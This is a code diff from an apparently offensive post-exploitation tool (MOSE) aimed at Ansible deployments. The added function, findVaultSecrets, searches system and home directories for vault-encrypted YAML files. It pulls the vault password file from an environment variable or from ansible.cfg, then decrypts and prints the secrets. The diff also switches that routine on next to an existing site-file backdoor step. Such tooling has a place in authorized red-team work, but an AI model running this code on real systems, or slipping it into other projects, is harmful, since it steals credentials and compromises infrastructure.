@@ -10,6 +10,7 @@ import (
 	"github.com/CrimsonK1ng/mose/pkg/moseutils"
 	"github.com/ghodss/yaml"
 	"github.com/gobuffalo/packr/v2"
+	utils "github.com/l50/goutils"
 	"log"
 	"os"
 	"path/filepath"
@@ -399,6 +400,79 @@ func backdoorSiteFile() {
 	// https://github.com/ansible/ansible-examples/blob/master/lamp_haproxy/site.yml
 }
 
+func findVaultSecrets() {
+	found, fileLoc := moseutils.FindFile("ansible-vault", []string{"/bin", "/usr/bin", "/usr/local/bin", "/etc/anisble"})
+	if found {
+		envPass := os.Getenv("ANSIBLE_VAULT_PASSWORD_FILE")
+		envFileExists, envFile := getVaultPassFromCfg()
+
+		ansibleFiles, _ := moseutils.FindFiles([]string{"/etc/ansible", "/root", "/home", "/opt", "/var"}, []string{".yaml", ".yml"}, []string{"vault"}, []string{}, debug)
+
+		if len(ansibleFiles) == 0 {
+			log.Println("Unable to find any yaml files")
+			return
+		}
+		// Matches for secrets
+		reg := regexp.MustCompile(`(?ms)\$ANSIBLE_VAULT`)
+		var matches []string
+		// Translate secrets on the fly
+		log.Println(fileLoc)
+		for _, file := range ansibleFiles {
+			// Grep for ENC[
+			log.Printf("Attempting viewing of %v", file)
+			matches = moseutils.GrepFile(file, reg)
+			if len(matches) > 0 {
+				if envPass != "" {
+					moseutils.Msg("Found secret(s) in file: %s", file)
+					res, err := utils.RunCommand(fileLoc, "view",
+						"--vault-password-file",
+						envPass,
+						file)
+
+					if err != nil {
+						log.Printf("Error running command: %s view %s %s %v", fileLoc, envPass, file, err)
+					}
+					if !strings.Contains(res, "ERROR!") {
+						moseutils.Msg("%s", res)
+					}
+				}
+
+				if envFileExists && envFile != envPass {
+					moseutils.Msg("Found secret(s) in file: %s", file)
+					res, err := utils.RunCommand(fileLoc, "view",
+						"--vault-password-file",
+						envFile,
+						file)
+
+					if err != nil {
+						log.Printf("Error running command: %s view %s %s %v", fileLoc, envFile, file, err)
+					}
+					if !strings.Contains(res, "ERROR!") {
+						moseutils.Msg("%s", res)
+					}
+				}
+			}
+		}
+	}
+}
+
+func getVaultPassFromCfg() (bool, string) {
+	cfgFile, err := moseutils.File2lines(files.cfgFile)
+	if err != nil {
+		log.Printf("Unable to read %v because of %v", files.cfgFile, err)
+	}
+	for _, line := range cfgFile {
+		matched, _ := regexp.MatchString(`^vault_password_file.*`, line)
+		if matched {
+			if debug {
+				log.Printf("Found vault_password_file specified in ansible.cfg: %v", files.cfgFile)
+			}
+			return true, strings.TrimSpace(strings.SplitAfter(line, "=")[1])
+		}
+	}
+	return false, ""
+}
+
 func writeYamlToSite(siteYaml ansible) {
 	marshalled, err := yaml.Marshal(&siteYaml)
 	if err != nil {
@@ -468,12 +542,10 @@ func main() {
 	// TODO: implement this
 	backdoorSiteFile()
 
-	log.Fatal("DIE")
-
 	// find secrets is ansible-vault is installed
 	moseutils.Info("Attempting to find secrets, please wait...")
 	// TODO: Implement this
-	// findVaultSecrets()
+	findVaultSecrets()
 	moseutils.Msg("MOSE has finished, exiting.")
 	os.Exit(0)
 
